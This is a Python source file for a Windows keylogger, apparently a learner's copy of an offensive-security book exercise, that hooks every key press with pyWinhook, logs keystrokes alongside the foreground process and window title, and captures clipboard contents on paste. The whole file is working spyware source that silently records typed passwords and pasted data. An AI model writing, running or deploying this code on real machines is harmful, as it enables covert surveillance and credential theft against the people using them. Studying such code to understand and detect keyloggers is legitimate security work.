from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO
import os
import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard
#128
TIMEOUT = 10

class KeyLogger:
    def __init__(self):
        self.current_window = None

    #capture currnet process
    def get_current_process(self):
        hwnd = windll.user32.GetForegroundWindow() # init - return the active window on desktop
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid)) # getting the pid of the proccess
        process_id = f'{pid.value}'
        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid) # get actual name by pid 0x400 - query for informaption / 0x10 - read information
        windll.psapi.GetModuleBaseNameA(
        h_process, None, byref(executable), 512) 
      
        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512) # get the title bar by getting window text - we create bytes buffer to init it there
        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError as e:
            print(f'{e}: window name unknown')
        print('\n', process_id,executable.value.decode(), self.current_window)
        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

    def mykeystroke(self, event):
        if event.WindowName != self.current_window: # check if the user changed windows
            self.get_current_process() # if yes - get the current window that opened
        if 32 < event.Ascii < 127: # If the keys that pressed is one of the keyboard keys
            print(chr(event.Ascii), end='')
        else:
            if event.Key == 'V':# We check if the user performed CNTRL+V - copy paste action
                win32clipboard.OpenClipboard() # grab the clipboard
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f'[PASTE] - {value}')
            else:
                print(f'{event.Key}')
        return True

def run():
    save_stdout = sys.stdout
    sys.stdout = StringIO()
    kl = KeyLogger() # create objecet
    hm = pyHook.HookManager() # define PyWinHook manager
    hm.KeyDown = kl.mykeystroke 
    hm.HookKeyboard() # define to get all presses
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages() # https://www.programcreek.com/python/example/41298/pythoncom.PumpWaitingMessages
    
    log = sys.stdout.getvalue()
    #print(log)
    sys.stdout = save_stdout
    return log   

if __name__ == '__main__':
    print(run())
    print('done.')